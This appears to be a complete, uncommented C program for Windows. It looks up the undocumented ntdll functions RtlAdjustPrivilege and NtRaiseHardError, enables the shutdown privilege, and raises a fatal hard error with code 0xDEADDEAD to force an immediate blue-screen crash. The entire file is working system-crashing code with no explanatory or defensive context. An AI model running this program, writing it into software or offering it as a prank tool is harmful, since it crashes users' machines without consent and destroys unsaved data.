#include <windows.h>

typedef LONG(WINAPI* RtlAdjustPrivilege_t)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef LONG(WINAPI* NtRaiseHardError_t)(LONG, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

int main(void) {
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (!ntdll) return 1;

	RtlAdjustPrivilege_t RtlAdjustPrivilege = (RtlAdjustPrivilege_t)GetProcAddress(ntdll, "RtlAdjustPrivilege");
	NtRaiseHardError_t NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(ntdll, "NtRaiseHardError");

	if (!RtlAdjustPrivilege || !NtRaiseHardError) return 1;

	BOOLEAN enabled;
	LONG status = RtlAdjustPrivilege(19, TRUE, FALSE, &enabled);

	if (status != 0) return 1;

	ULONG response;
	NtRaiseHardError(0xDEADDEAD, 0, 0, NULL, 6, &response);

	return 0;
}